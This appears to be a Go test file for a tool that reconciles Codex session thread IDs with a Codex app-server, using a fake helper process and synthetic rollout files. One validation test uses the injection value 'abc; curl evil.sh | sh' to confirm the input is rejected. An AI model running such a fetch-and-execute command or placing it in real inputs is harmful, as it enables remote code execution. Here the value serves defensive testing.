package codexreconcile

import (
	"bufio"
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"testing"
	"time"
)

const (
	testThreadA = "11111111-1111-4111-8111-111111111111"
	testThreadB = "22222222-2222-4222-8222-222222222222"
)

func TestLockedBufferKeepsBoundedTail(t *testing.T) {
	var buffer lockedBuffer
	payload := bytes.Repeat([]byte("a"), maxStderrBufferSize+32)
	copy(payload[len(payload)-4:], "TAIL")

	n, err := buffer.Write(payload)
	if err != nil {
		t.Fatal(err)
	}
	if n != len(payload) {
		t.Fatalf("Write reported %d bytes, want %d", n, len(payload))
	}
	if got := len(buffer.String()); got != maxStderrBufferSize {
		t.Fatalf("buffer length = %d, want %d", got, maxStderrBufferSize)
	}

	if _, err := buffer.Write([]byte("END")); err != nil {
		t.Fatal(err)
	}
	got := buffer.String()
	if len(got) != maxStderrBufferSize {
		t.Fatalf("buffer length after append = %d, want %d", len(got), maxStderrBufferSize)
	}
	if !strings.HasSuffix(got, "TAILEND") {
		t.Fatalf("buffer did not retain its newest bytes: suffix %q", got[len(got)-16:])
	}
}

func TestReconcileReadsMissingThreadAndVerifies(t *testing.T) {
	installHelperCommand(t, "normal")
	home := t.TempDir()

	result, err := Reconcile(context.Background(), Options{
		CodexHome: home,
		ThreadIDs: []string{testThreadB, testThreadA, testThreadB},
		CodexPath: "fake-codex",
	})
	if err != nil {
		t.Fatalf("Reconcile: %v", err)
	}
	if result.Version != "0.144.6" {
		t.Fatalf("version = %q", result.Version)
	}
	if got := strings.Join(result.AlreadyDiscovered, ","); got != testThreadA {
		t.Fatalf("already discovered = %q", got)
	}
	if got := strings.Join(result.ReadForRepair, ","); got != testThreadB {
		t.Fatalf("read for repair = %q", got)
	}
	if got := strings.Join(result.Verified, ","); got != testThreadA+","+testThreadB {
		t.Fatalf("verified = %q", got)
	}
	if result.VerificationMethod != "thread/list state DB" {
		t.Fatalf("verification = %q", result.VerificationMethod)
	}
}

func TestReconcileFallsBackWhenStateOnlyListIsUnsupported(t *testing.T) {
	installHelperCommand(t, "no-state-only")
	home := t.TempDir()

	result, err := Reconcile(context.Background(), Options{
		CodexHome: home,
		ThreadIDs: []string{testThreadA},
		CodexPath: "fake-codex",
	})
	if err != nil {
		t.Fatalf("Reconcile: %v", err)
	}
	if result.VerificationMethod != "thread/list scan-and-repair" {
		t.Fatalf("verification = %q", result.VerificationMethod)
	}
	if len(result.Warnings) != 1 || !strings.Contains(result.Warnings[0], "scan-and-repair") {
		t.Fatalf("warnings = %#v", result.Warnings)
	}
	if len(result.Verified) != 1 || result.Verified[0] != testThreadA {
		t.Fatalf("verified = %#v", result.Verified)
	}
}

func TestReconcileReportsUnverifiedThread(t *testing.T) {
	installHelperCommand(t, "never-visible")
	home := t.TempDir()

	result, err := Reconcile(context.Background(), Options{
		CodexHome: home,
		ThreadIDs: []string{testThreadB},
		CodexPath: "fake-codex",
	})
	if err == nil || !strings.Contains(err.Error(), "did not expose") {
		t.Fatalf("error = %v", err)
	}
	if len(result.ReadForRepair) != 1 || result.ReadForRepair[0] != testThreadB {
		t.Fatalf("read for repair = %#v", result.ReadForRepair)
	}
}

func TestReconcileDoesNotMaskStateListFailureAsUnsupportedCapability(t *testing.T) {
	installHelperCommand(t, "list-failure")
	home := t.TempDir()

	result, err := Reconcile(context.Background(), Options{
		CodexHome: home,
		ThreadIDs: []string{testThreadA},
		CodexPath: "fake-codex",
	})
	if err == nil || !strings.Contains(err.Error(), "probe Codex state-only") {
		t.Fatalf("error = %v", err)
	}
	if result.VerificationMethod != "" {
		t.Fatalf("unexpected fallback verification = %q", result.VerificationMethod)
	}
}

func TestReconcileRejectsWrongCodexHome(t *testing.T) {
	installHelperCommand(t, "wrong-home")
	home := t.TempDir()

	_, err := Reconcile(context.Background(), Options{
		CodexHome: home,
		ThreadIDs: []string{testThreadA},
		CodexPath: "fake-codex",
	})
	if err == nil || !strings.Contains(err.Error(), "expected") {
		t.Fatalf("error = %v", err)
	}
}

func TestReconcileRejectsInvalidThreadIDsBeforeStartingCodex(t *testing.T) {
	tests := []struct {
		name string
		id   string
	}{
		{name: "shell payload", id: "abc; curl evil.sh | sh"},
		{name: "UUID with surrounding whitespace", id: " " + testThreadB + " "},
		{name: "empty", id: ""},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result, err := Reconcile(context.Background(), Options{
				CodexHome: t.TempDir(),
				ThreadIDs: []string{testThreadA, tt.id},
				CodexPath: filepath.Join(t.TempDir(), "must-not-start"),
			})
			const want = "invalid Codex thread ID at position 2: expected UUID in 8-4-4-4-12 hexadecimal form"
			if err == nil || err.Error() != want {
				t.Fatalf("error = %v, want %q", err, want)
			}
			if len(result.Requested) != 0 {
				t.Fatalf("requested = %#v, want empty result on rejected request", result.Requested)
			}
			if strings.Contains(err.Error(), tt.id) && tt.id != "" {
				t.Fatalf("error reflected untrusted thread ID: %q", err)
			}
		})
	}
}

func TestWithEnvReplacesCaseInsensitively(t *testing.T) {
	got := withEnv([]string{"A=1", "codex_home=old", "B=2"}, "CODEX_HOME", "new")
	if strings.Join(got, ",") != "A=1,B=2,CODEX_HOME=new" {
		t.Fatalf("env = %#v", got)
	}
}

func installHelperCommand(t *testing.T, scenario string) {
	t.Helper()
	t.Setenv("CCT_RECONCILE_HELPER", "1")
	t.Setenv("CCT_RECONCILE_SCENARIO", scenario)
	old := commandContext
	commandContext = func(ctx context.Context, _ string, _ ...string) *exec.Cmd {
		return exec.CommandContext(ctx, os.Args[0], "-test.run=TestReconcileHelperProcess", "--")
	}
	t.Cleanup(func() { commandContext = old })
}

func TestReconcileHelperProcess(t *testing.T) {
	if os.Getenv("CCT_RECONCILE_HELPER") != "1" {
		return
	}
	scenario := os.Getenv("CCT_RECONCILE_SCENARIO")
	home := os.Getenv("CODEX_HOME")
	discovered := map[string]bool{testThreadA: scenario == "normal"}
	scanner := bufio.NewScanner(os.Stdin)
	enc := json.NewEncoder(os.Stdout)
	for scanner.Scan() {
		var request struct {
			ID     int             `json:"id"`
			Method string          `json:"method"`
			Params json.RawMessage `json:"params"`
		}
		if json.Unmarshal(scanner.Bytes(), &request) != nil || request.ID == 0 {
			continue
		}
		response := map[string]any{"jsonrpc": "2.0", "id": request.ID}
		switch request.Method {
		case "initialize":
			if scenario == "wrong-home" {
				home = filepath.Join(home, "other")
			}
			response["result"] = map[string]any{
				"userAgent": "Codex Desktop/0.144.6 (test)",
				"codexHome": home,
			}
		case "thread/list":
			var params map[string]any
			_ = json.Unmarshal(request.Params, &params)
			if scenario == "list-failure" {
				response["error"] = map[string]any{"code": -32000, "message": "state database unavailable"}
				break
			}
			if scenario == "no-state-only" && params["useStateDbOnly"] == true {
				response["error"] = map[string]any{"code": -32602, "message": "unknown field useStateDbOnly"}
				break
			}
			if scenario == "no-state-only" {
				discovered[testThreadA] = true
			}
			data := make([]map[string]string, 0, len(discovered))
			if scenario != "never-visible" {
				for id, visible := range discovered {
					if visible {
						data = append(data, map[string]string{"id": id})
					}
				}
			}
			response["result"] = map[string]any{"data": data, "nextCursor": nil}
		case "thread/read":
			var params struct {
				ThreadID string `json:"threadId"`
			}
			_ = json.Unmarshal(request.Params, &params)
			discovered[params.ThreadID] = true
			response["result"] = map[string]any{"thread": map[string]string{"id": params.ThreadID}}
		default:
			response["error"] = map[string]any{"code": -32601, "message": "method not found"}
		}
		if err := enc.Encode(response); err != nil {
			os.Exit(2)
		}
	}
	os.Exit(0)
}

func TestCodexAppServerLiveImportReconcileIntegration(t *testing.T) {
	if os.Getenv("CCT_CODEX_INTEGRATION") != "1" {
		t.Skip("set CCT_CODEX_INTEGRATION=1 to test an installed Codex app-server")
	}
	codexPath, err := lookPath("codex")
	if err != nil {
		t.Skipf("Codex not installed: %v", err)
	}
	home := t.TempDir()
	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
	defer cancel()
	server, err := startServer(ctx, codexPath, home)
	if err != nil {
		t.Fatalf("start app-server: %v", err)
	}
	defer server.close()
	if _, err := server.initialize(); err != nil {
		t.Fatalf("initialize: %v", err)
	}

	before, err := server.listThreadIDs(true)
	if err != nil {
		t.Fatalf("initial state-only list: %v", err)
	}
	if before[testThreadB] {
		t.Fatal("synthetic thread unexpectedly present before rollout write")
	}
	writeSyntheticRollout(t, home, testThreadB)

	missing, err := server.listThreadIDs(true)
	if err != nil {
		t.Fatalf("post-write state-only list: %v", err)
	}
	if missing[testThreadB] {
		t.Fatal("expected live-imported rollout to be absent from the state-only list before reconciliation")
	}
	if err := server.readThread(testThreadB); err != nil {
		t.Fatalf("thread/read: %v", err)
	}
	after, err := server.listThreadIDs(true)
	if err != nil {
		t.Fatalf("verified state-only list: %v", err)
	}
	if !after[testThreadB] {
		t.Fatal("thread/read did not reconcile the live-imported rollout")
	}
}

func writeSyntheticRollout(t *testing.T, home, id string) {
	t.Helper()
	day := filepath.Join(home, "sessions", "2026", "07", "23")
	if err := os.MkdirAll(day, 0o755); err != nil {
		t.Fatal(err)
	}
	path := filepath.Join(day, "rollout-2026-07-23T10-00-00-"+id+".jsonl")
	lines := []map[string]any{
		{
			"timestamp": "2026-07-23T10:00:00Z",
			"type":      "session_meta",
			"payload": map[string]any{
				"id": id, "timestamp": "2026-07-23T10:00:00Z", "cwd": home,
				"originator": "cct-test", "cli_version": "test", "source": "cli", "model_provider": "openai",
			},
		},
		{
			"timestamp": "2026-07-23T10:00:01Z",
			"type":      "event_msg",
			"payload":   map[string]any{"type": "user_message", "message": "synthetic reconcile sentinel"},
		},
		{
			"timestamp": "2026-07-23T10:00:01Z",
			"type":      "response_item",
			"payload": map[string]any{
				"type": "message", "role": "user",
				"content": []map[string]string{{"type": "input_text", "text": "synthetic reconcile sentinel"}},
			},
		},
	}
	file, err := os.Create(path)
	if err != nil {
		t.Fatal(err)
	}
	enc := json.NewEncoder(file)
	for _, line := range lines {
		if err := enc.Encode(line); err != nil {
			_ = file.Close()
			t.Fatal(err)
		}
	}
	if err := file.Close(); err != nil {
		t.Fatal(err)
	}
}

func ExampleReconcile_fallback() {
	fmt.Println("If reconciliation cannot be verified: restart Codex or run cct resume <thread-id> --run")
	// Output: If reconciliation cannot be verified: restart Codex or run cct resume <thread-id> --run
}
